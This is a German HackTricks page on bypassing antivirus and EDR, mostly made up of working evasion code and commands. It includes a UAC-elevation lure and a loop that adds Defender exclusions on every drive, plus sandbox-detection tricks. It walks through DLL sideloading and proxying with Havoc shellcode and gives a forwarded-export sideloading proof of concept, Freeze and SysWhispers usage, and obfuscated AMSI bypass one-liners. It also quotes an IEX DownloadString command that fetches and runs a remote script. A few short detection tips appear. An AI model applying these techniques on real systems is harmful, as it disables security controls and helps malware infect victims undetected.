# Antivirus (AV)-Umgehung

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich von** [**@m2rc_p**](https://twitter.com/m2rc_p)** verfasst!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender am Ausführen zu hindern.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, um Windows Defender zu stoppen, indem es einen anderen AV vortäuscht.
- [Defender deaktivieren, wenn du Admin bist](basic-powershell-for-pentesters/README.md)

### UAC-Köder im Installer-Stil vor Manipulationen an Defender

Öffentlich verfügbare Loader, die sich häufig als Game-Cheats tarnen, werden oft als nicht signierte Node.js/Nexe-Installer ausgeliefert, die zuerst **den Benutzer um erhöhte Rechte bitten** und erst danach Defender deaktivieren. Der Ablauf ist einfach:

1. Mit `net session` prüfen, ob administrative Rechte vorliegen. Der Befehl ist nur erfolgreich, wenn der aufrufende Prozess Admin-Rechte hat. Ein Fehler bedeutet also, dass der Loader als Standardbenutzer ausgeführt wird.
2. Sich sofort mit dem Verb `RunAs` neu starten, um die erwartete UAC-Zustimmungsaufforderung auszulösen und dabei die ursprüngliche Befehlszeile beizubehalten.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Opfer gehen ohnehin davon aus, „gecrackte“ Software zu installieren, und akzeptieren die Aufforderung daher meist. So erhält die Malware die Rechte, die sie benötigt, um die Defender-Richtlinie zu ändern.<sup>[[26]](#references)</sup>

### Pauschale `MpPreference`-Ausnahmen für jeden Laufwerksbuchstaben

Nach der Erhöhung der Rechte maximieren GachiLoader-artige Ketten die blinden Flecken von Defender, statt den Dienst vollständig zu deaktivieren. Der Loader beendet zunächst den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und fügt dann **extrem weit gefasste Ausnahmen** hinzu, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jedes Wechselmedium nicht mehr gescannt werden kann:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Wichtige Beobachtungen:

- Die Schleife durchläuft jedes eingebundene Dateisystem (D:\, E:\, USB-Sticks usw.), sodass **alle zukünftigen Payloads, die irgendwo auf der Festplatte abgelegt werden, ignoriert werden**.
- Der Ausschluss der Erweiterung `.sys` ist vorausschauend – Angreifer behalten sich so die Möglichkeit vor, später unsignierte Treiber zu laden, ohne Defender erneut anzufassen.
- Alle Änderungen landen unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`. So können spätere Phasen bestätigen, dass die Ausschlüsse bestehen bleiben, oder sie erweitern, ohne erneut UAC auszulösen.

Da kein Defender-Dienst angehalten wird, melden einfache Zustandsprüfungen weiterhin „Antivirus aktiv“, obwohl die Echtzeitprüfung diese Pfade nie berücksichtigt.<sup>[[26]](#references)</sup>

## **AV-Evasion-Methodik**

AVs verwenden derzeit verschiedene Methoden, um zu prüfen, ob eine Datei schädlich ist: statische Erkennung, dynamische Analyse und bei den fortschrittlicheren EDRs Verhaltensanalyse.

### **Statische Erkennung**

Statische Erkennung erfolgt, indem bekannte schädliche Zeichenfolgen oder Bytefolgen in einer Binärdatei oder einem Skript erkannt werden. Außerdem werden Informationen aus der Datei selbst extrahiert (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Symbol, Prüfsumme usw.). Das bedeutet, dass bekannte öffentliche Tools leichter erkannt werden können, da sie wahrscheinlich bereits analysiert und als schädlich eingestuft wurden. Es gibt verschiedene Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Verschlüsselung**

Wenn du die Binärdatei verschlüsselst, kann AV dein Programm nicht erkennen. Du brauchst jedoch eine Art Loader, um das Programm zu entschlüsseln und im Speicher auszuführen.

- **Obfuskation**

Manchmal reicht es aus, einige Zeichenfolgen in deiner Binärdatei oder deinem Skript zu ändern, damit es AV passiert. Je nachdem, was du obfuskieren möchtest, kann dies jedoch zeitaufwendig sein.

- **Eigene Tools**

Wenn du eigene Tools entwickelst, gibt es keine bekannten schädlichen Signaturen. Das kostet jedoch viel Zeit und Mühe.

> [!TIP]
> Eine gute Möglichkeit, die statische Erkennung durch Windows Defender zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Das Tool teilt die Datei in mehrere Segmente auf und lässt Defender jedes einzeln scannen. So kann es dir genau sagen, welche Zeichenfolgen oder Bytes in deiner Binärdatei markiert werden.

Ich empfehle dir dringend, dir diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV-Evasion anzusehen.

### Offline-PE-Merkmalstests für statische Klassifikatoren

Gepackte oder verschlüsselte Payload-Bytes sind nur eine Eingabe für einen statischen Klassifikator. EMBER2024 extrahiert PE-Merkmale wie Importe, Exporte, Sektionen, Header und Authenticode-Daten.<sup>[[48]](#references)</sup> In einem Loader-Experiment senkte das Hinzufügen von 141 harmlos wirkenden Importen den bösartigen EMBER2024-Score um 93 %, während mit Malware verbundene Importe ihn erhöhten. Dieses Ergebnis gilt für dieses Modell und diese Samples und stellt keine zuverlässige Umgehung eines bestimmten AV-/EDR-Produkts dar.<sup>[[50]](#references)</sup>

Bei einem autorisierten Loader-Test solltest du Payload und Ausführungspfad konstant halten, pro Variante jeweils nur eine vorgesehene Build-Variable ändern und die Scores offline vergleichen. Untersuche die resultierenden PE-Merkmale, da eine Build-Änderung mehr als eine Merkmalsgruppe beeinflussen kann.<sup>[[49]](#references)[[50]](#references)</sup> Damit vorgesehene Importe in der IAT bleiben, rufe die ausgewählten Win32-APIs aus erreichbarem Code auf. Variiere die Auswahl und verteile die Aufrufstellen auf verschiedene Builds, statt eine feste Tarnfunktion zu erstellen, die zu einer Signatur werden könnte. Das Experiment ergab außerdem niedrigere Scores bei gültiger Codesignierung, Exporteinträgen und mehr Funktionen, die `.pdata` vergrößern; eine ungültige Signierung hatte kaum Auswirkungen, und der Effekt von `.pdata` war gering.<sup>[[50]](#references)</sup>

Das Paket `thrember` bietet Merkmalsextraktion und Benchmark-Modelle. Installiere es und verwende `thrember.download_models("models")` mit einem bereits vorhandenen `models`-Verzeichnis. Führe den Scorer anschließend aus dem übergeordneten Verzeichnis aus: Der Download-Helfer ändert das aktuelle Arbeitsverzeichnis. Der PE-Klassifikator kann ein Verzeichnis mit Builds bewerten, ohne sie an einen Scan-Dienst zu übermitteln:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Halte die Modell- und Feature-Extractor-Versionen während des Vergleichs konstant. Ein niedrigerer Offline-Score zeigt nur, wie dieser Klassifikator auf die geänderte Binärdatei reagiert; er beweist nicht, dass Verhaltensanalyse, Emulation oder das abweichende Modell eines Anbieters umgangen werden.<sup>[[49]](#references)[[50]](#references)</sup> Informationen zu [Polymorphismus pro Build und Tarnung der äußeren Binärdatei in virtualisierten Payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) findest du im separaten Ausführungsmodell.

### **Dynamische Analyse**

Bei der dynamischen Analyse führt das AV deine Binärdatei in einer Sandbox aus und überwacht sie auf bösartige Aktivitäten (z. B. den Versuch, die Passwörter deines Browsers zu entschlüsseln und auszulesen, einen Minidump von LSASS zu erstellen usw.). Dieser Teil kann etwas kniffliger sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Vor der Ausführung warten** Je nach Implementierung kann das eine gute Möglichkeit sein, die dynamische Analyse des AVs zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, damit der Arbeitsablauf des Benutzers nicht unterbrochen wird. Lange Wartezeiten können daher die Analyse von Binärdateien stören. Das Problem ist, dass viele AV-Sandboxes die Wartezeit je nach Implementierung einfach überspringen können.
- **Ressourcen des Computers prüfen** Sandboxes verfügen normalerweise über sehr wenige Ressourcen (z. B. < 2 GB RAM), da sie sonst den Computer des Benutzers verlangsamen könnten. Hier kannst du auch sehr kreativ werden, zum Beispiel die CPU-Temperatur oder sogar die Lüftergeschwindigkeit prüfen – nicht alles davon wird in der Sandbox implementiert sein.
- **Maschinenspezifische Prüfungen** Wenn du einen Benutzer ins Visier nehmen möchtest, dessen Workstation der Domäne „contoso.local“ angehört, kannst du die Domäne des Computers prüfen und feststellen, ob sie mit der von dir angegebenen übereinstimmt. Ist das nicht der Fall, kannst du dein Programm beenden lassen.

Wie sich herausstellt, lautet der Computername der Microsoft-Defender-Sandbox HAL9TH. Du kannst also vor der Detonation in deiner Malware den Computernamen prüfen. Wenn er HAL9TH lautet, befindest du dich in der Defender-Sandbox und kannst dein Programm beenden lassen.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere wirklich gute Tipps von [@mgeeky](https://twitter.com/mariuszbit), um Sandboxes zu umgehen:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie wir bereits in diesem Beitrag erwähnt haben, werden **öffentliche Tools** irgendwann **erkannt**. Deshalb solltest du dir folgende Frage stellen:

Wenn du beispielsweise LSASS dumpen möchtest, **musst du wirklich mimikatz verwenden**? Oder könntest du ein anderes, weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpen kann?

Die richtige Antwort ist wahrscheinlich Letzteres. Am Beispiel von mimikatz: Es ist wahrscheinlich eines der am häufigsten von AVs und EDRs markierten Malware-Tools, wenn nicht sogar das am häufigsten markierte. Das Projekt selbst ist zwar supercool, aber es ist auch ein Albtraum, damit AVs zu umgehen. Suche also einfach nach Alternativen für das, was du erreichen möchtest.

> [!TIP]
> Wenn du deine Payloads zur Umgehung von Erkennung modifizierst, solltest du **die automatische Übermittlung von Samples** in Defender deaktivieren. Und bitte, wirklich: **Lade nichts auf VIRUSTOTAL hoch**, wenn du langfristig Erkennung umgehen möchtest. Wenn du prüfen willst, ob deine Payload von einem bestimmten AV erkannt wird, installiere es in einer VM, versuche die automatische Übermittlung von Samples zu deaktivieren und teste es dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wenn möglich, solltest du für die Umgehung von Erkennung immer **DLLs bevorzugen**. Meiner Erfahrung nach werden DLL-Dateien normalerweise **deutlich seltener erkannt** und analysiert. Das ist also ein sehr einfacher Trick, um in manchen Fällen einer Erkennung zu entgehen (sofern deine Payload natürlich auf irgendeine Weise als DLL ausgeführt werden kann).

Wie wir in diesem Bild sehen, hat eine DLL-Payload von Havoc auf antiscan.me eine Erkennungsrate von 4/26, während die EXE-Payload eine Erkennungsrate von 7/26 aufweist.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Vergleich einer normalen Havoc-EXE-Payload mit einer normalen Havoc-DLL auf antiscan.me</p></figcaption></figure>

Nun zeigen wir einige Tricks, mit denen du DLL-Dateien deutlich unauffälliger machen kannst.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die vom Loader verwendete DLL-Suchreihenfolge aus, indem die Opferanwendung und die bösartigen Payloads nebeneinander platziert werden.

Mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden PowerShell-Skript kannst du nach Programmen suchen, die für DLL Sideloading anfällig sind:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Dieser Befehl gibt die Liste der Programme in „C:\Program Files\\“ aus, die für DLL hijacking anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, **DLL Hijackable/Sideloadable programs selbst zu erkunden**. Richtig ausgeführt ist diese Technik ziemlich unauffällig. Wenn du jedoch öffentlich bekannte DLL Sideloadable programs verwendest, kannst du leicht entdeckt werden.

Eine bösartige DLL mit dem Namen abzulegen, den ein Programm zu laden erwartet, reicht nicht aus, um dein Payload zu laden, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm an die Proxy-DLL (die bösartige DLL) richtet, an die ursprüngliche DLL weiter. So bleibt die Funktionalität des Programms erhalten und dein Payload kann ausgeführt werden.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Dies sind die Schritte, die ich durchgeführt habe:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Der letzte Befehl liefert uns zwei Dateien: eine DLL-Quellcodevorlage und die umbenannte Original-DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Das sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (mit [SGN](https://github.com/EgeBalci/sgn) kodiert) als auch die Proxy-DLL haben bei [antiscan.me](https://antiscan.me) eine Detection rate von 0/26! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dir dringend**, dir [S3cur3Th1sSh1t's Twitch-VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading und auch [ippsecs Video](https://www.youtube.com/watch?v=3eROsG_WNpE) anzusehen, um mehr über das zu erfahren, was wir ausführlicher besprochen haben.

### Weitergeleitete Exports missbrauchen (ForwardSideLoading)

Windows-PE-Module können Funktionen exportieren, die eigentlich „Forwarder“ sind: Statt auf Code zu verweisen, enthält der Exporteintrag einen ASCII-String im Format `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, führt der Windows-Loader Folgendes aus:

- `TargetDll` laden, falls es noch nicht geladen ist
- `TargetFunc` daraus auflösen

Wichtige Verhaltensweisen:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, zu der auch das Verzeichnis des Moduls gehört, das die Weiterleitung auflöst.

Das ermöglicht eine indirekte Sideloading-Primitivtechnik: Finde eine signierte DLL, die eine Funktion exportiert, die an ein Nicht-KnownDLL-Modul weitergeleitet wird, und platziere diese signierte DLL zusammen mit einer vom Angreifer kontrollierten DLL, deren Name exakt dem Namen des weitergeleiteten Zielmoduls entspricht. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis, wodurch dein DllMain ausgeführt wird.<sup>[[13]](#references)</sup>

Beispiel unter Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` ist keine KnownDLL und wird daher über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine schädliche `NCRYPTPROV.dll` im selben Ordner ab. Ein minimales DllMain reicht aus, um Codeausführung zu erreichen; du musst die weitergeleitete Funktion nicht implementieren, damit DllMain ausgelöst wird.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Lösen Sie die Weiterleitung mit einem signierten LOLBin aus:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (signiert) lädt die Side-by-Side-`keyiso.dll` (signiert)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader dem Forward zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt dann `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhältst du erst einen „missing API“-Fehler, nachdem `DllMain` bereits ausgeführt wurde

Hunting-Tipps:
- Konzentriere dich auf weitergeleitete Exporte, bei denen das Zielmodul keine KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgeführt.
- Weitergeleitete Exporte kannst du mit Tools wie den folgenden aufzählen:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sieh dir das Windows 11-Forwarder-Inventar an, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideen zur Erkennung/Abwehr:
- LOLBins (z. B. rundll32.exe) überwachen, die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden von Nicht-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Bei Prozess-/Modulketten wie `rundll32.exe` → Nicht-System-`keyiso.dll` → `NCRYPTPROV.dll` in benutzerschreibbaren Pfaden einen Alarm auslösen
- Code-Integritätsrichtlinien (WDAC/AppLocker) erzwingen und Schreib- und Ausführungsrechte in Anwendungsverzeichnissen verweigern

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Mit Freeze kannst du deinen shellcode auf unauffällige Weise laden und ausführen.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist ein Katz-und-Maus-Spiel: Was heute funktioniert, kann morgen erkannt werden. Verlasse dich daher nie nur auf ein einziges Tool und versuche, wenn möglich, mehrere Evasion-Techniken miteinander zu kombinieren.

## Direct/Indirect Syscalls & SSN-Auflösung (SysWhispers4)

EDRs setzen häufig **Inline-Hooks im User-Mode** auf Syscall-Stubs in `ntdll.dll`. Um diese Hooks zu umgehen, kannst du **Direct**- oder **Indirect-Syscall-Stubs** generieren, die die korrekte **SSN** (System Service Number) laden und in den Kernel-Modus wechseln, ohne den gehookten exportierten Einstiegspunkt auszuführen.<sup>[[32]](#references)</sup>

**Aufrufoptionen:**
- **Direct (embedded)**: Gibt eine `syscall`-/`sysenter`-/`SVC #0`-Instruktion im generierten Stub aus (kein Aufruf eines `ntdll`-Exports).
- **Indirect**: Springt zu einem vorhandenen **syscall gadget** in `ntdll`, sodass der Kernel-Übergang scheinbar von `ntdll` ausgeht (nützlich zur Umgehung heuristischer Erkennung); **randomized indirect** wählt bei jedem Aufruf ein Gadget aus einem Pool aus.
- **Egg-hunt**: Vermeidet es, die statische Opcode-Sequenz `0F 05` auf der Festplatte einzubetten; löst zur Laufzeit eine Syscall-Sequenz auf.

**Hook-resistente Strategien zur SSN-Auflösung:**
- **FreshyCalls (VA sort)**: Leitet SSNs ab, indem Syscall-Stubs nach virtueller Adresse sortiert werden, anstatt Stub-Bytes auszulesen.
- **SyscallsFromDisk**: Bindet eine saubere `\KnownDlls\ntdll.dll` ein, liest SSNs aus deren `.text`-Bereich und hebt anschließend die Zuordnung auf (umgeht alle Hooks im Speicher).
- **RecycledGate**: Kombiniert die SSN-Ableitung durch Sortierung nach virtueller Adresse mit der Opcode-Validierung, wenn ein Stub sauber ist; bei gehookten Stubs greift es auf die Ableitung über virtuelle Adressen zurück.
- **HW Breakpoint**: Setzt DR0 auf die `syscall`-Instruktion und verwendet einen VEH, um die SSN zur Laufzeit aus `EAX` auszulesen, ohne gehookte Bytes zu analysieren.

Beispiel für die Verwendung von SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Beim Parsen sauberer x64-`ntdll`-Syscall-Exports für eine SSN sollten sowohl `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) als auch dieselbe Sequenz mit vorangestelltem `F3 0F 1E FA` (`endbr64`) zugelassen werden. Letztere ist ein CET-präfixter Stub: Ein Parser, der davon ausgeht, dass sich die SSN immer an einem festen Offset befindet, übersieht ihn. Schlägt die Initialisierung von Indirect Syscalls fehl und greift der Loader auf `GetProcAddress` zurück, können Aufrufe über diese Exports wieder auf User-Mode-Hooks treffen.<sup>[[54]](#references)</sup>

## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um „[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)“ zu verhindern. Anfangs konnten AVs nur **Dateien auf dem Datenträger** scannen. Wenn man Payloads also irgendwie **direkt im Speicher** ausführen konnte, konnte das AV nichts dagegen tun, da ihm die nötige Sichtbarkeit fehlte.

Die AMSI-Funktion ist in diese Windows-Komponenten integriert.

- Benutzerkontensteuerung (UAC; Elevation von EXE, COM, MSI oder ActiveX-Installationen)
- PowerShell (Skripte, interaktive Nutzung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office-VBA-Makros

Dadurch können Antivirenlösungen das Verhalten von Skripten überprüfen, indem ihnen Skriptinhalte unverschlüsselt und unverschleiert zugänglich gemacht werden.

Das Ausführen von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` löst unter Windows Defender den folgenden Alarm aus.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, dass `amsi:` und anschließend der Pfad zur ausführbaren Datei vorangestellt werden, aus der das Skript ausgeführt wurde — in diesem Fall powershell.exe.

Wir haben keine Datei auf den Datenträger geschrieben, wurden aber trotzdem im Speicher durch AMSI erkannt.

Außerdem wird C#-Code seit **.NET 4.8** ebenfalls durch AMSI geleitet. Das betrifft sogar `Assembly.Load(byte[])`, um die Ausführung im Speicher zu laden. Deshalb werden für die Ausführung im Speicher niedrigere .NET-Versionen (wie 4.7.2 oder älter) empfohlen, wenn AMSI umgangen werden soll.

Es gibt einige Möglichkeiten, AMSI zu umgehen:

- **Verschleierung**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Verändern der zu ladenden Skripte eine gute Möglichkeit sein, der Erkennung zu entgehen.

AMSI kann Skripte jedoch auch dann entschleiern, wenn sie mehrere Verschleierungsebenen aufweisen. Je nach Vorgehensweise kann Verschleierung daher eine schlechte Option sein. Dadurch ist das Umgehen nicht ganz einfach. Manchmal reicht es allerdings aus, ein paar Variablennamen zu ändern. Es hängt also davon ab, wie stark etwas markiert wurde.

- **AMSI-Bypass**

Da AMSI durch das Laden einer DLL in den powershell-Prozess (sowie cscript.exe, wscript.exe usw.) implementiert wird, lässt sich die DLL leicht manipulieren — sogar als unprivilegierter Benutzer. Aufgrund dieses Implementierungsfehlers von AMSI haben Forscher mehrere Möglichkeiten gefunden, AMSI-Scans zu umgehen.

**Einen Fehler erzwingen**

Wenn die AMSI-Initialisierung fehlschlägt (`amsiInitFailed`), wird für den aktuellen Prozess kein Scan gestartet. Dies wurde ursprünglich von [Matt Graeber](https://twitter.com/mattifestation) offengelegt. Microsoft hat eine Signatur entwickelt, um eine weitere Verbreitung zu verhindern.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Es genügte eine einzige PowerShell-Codezeile, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher sind einige Änderungen nötig, um diese Technik anzuwenden.

Hier ist ein modifizierter AMSI-Bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Beachte, dass dies wahrscheinlich markiert wird, sobald dieser Beitrag veröffentlicht ist. Du solltest also keinen Code veröffentlichen, wenn du unentdeckt bleiben möchtest.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt. Dabei wird die Adresse der Funktion „AmsiScanBuffer“ in amsi.dll gesucht (sie ist für das Scannen der vom Benutzer bereitgestellten Eingabe zuständig) und mit Anweisungen überschrieben, die den Code für E_INVALIDARG zurückgeben. Dadurch gibt das Ergebnis des eigentlichen Scans 0 zurück, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

Es gibt noch viele weitere Techniken, um AMSI mit PowerShell zu umgehen. Sieh dir [**diese Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**dieses Repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) an, um mehr darüber zu erfahren.

### AMSI-COM-Scan-Pointer-Umleitung statt `AmsiScanBuffer`-Patch

Ein weiterer prozesslokaler Bypass lässt den Einstiegspunkt `AmsiScanBuffer` unverändert. Beim dokumentierten 64-Bit-.NET-Loader wird ein AMSI-COM-Objekt mit der CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec` erstellt; `Marshal.GetIUnknownForObject()` liefert den Interface-Zeiger, und sein vtable-Slot am Offset `0x18` wird als Ziel des Scan-Aufrufs verwendet. Der Loader überschreibt einen nativen Zeiger auf `Console.Clear()` mit einem kleinen x64-Stub, ändert diesen vtable-Eintrag unter `VirtualProtect()` so, dass er auf den Stub zeigt, und stellt anschließend den ursprünglichen Seitenschutz wieder her. Voraussetzung sind sowohl die 64-Bit-Zeigerbreite als auch das erwartete COM-Layout; dies ist kein allgemeiner Offset für beliebige AMSI-Schnittstellen oder Builds. Zu den zuvor beobachteten Stufen gehören das [Laden eines signierten AppDomainManager-Sidecars](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) und die [RESX-Deserialisierung](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Die beobachteten Stub-Bytes lauten `41 C7 00 01 00 00 00 33 C0 C3`: Sie schreiben **1** in den Ergebniszeiger in `r8` und geben **0** in `eax` zurück. Die dokumentierte Behauptung, das Scan-Ergebnis sei `AMSI_RESULT_CLEAN` (0), setzt also den Rückgabewert `S_OK` mit dem Ausgabe-Enum gleich. In der dokumentierten Reihenfolge von `AMSI_RESULT` steht **1** für `AMSI_RESULT_NOT_DETECTED`; der Wert liegt weiterhin unterhalb der Erkennungsschwelle.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### AMSI blockieren, indem das Laden von amsi.dll verhindert wird (LdrLoadDll-Hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User-Mode-Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn es sich bei dem angeforderten Modul um `amsi.dll` handelt. Dadurch wird AMSI nie geladen und in diesem Prozess werden keine Scans durchgeführt.<sup>[[23]](#references)</sup>

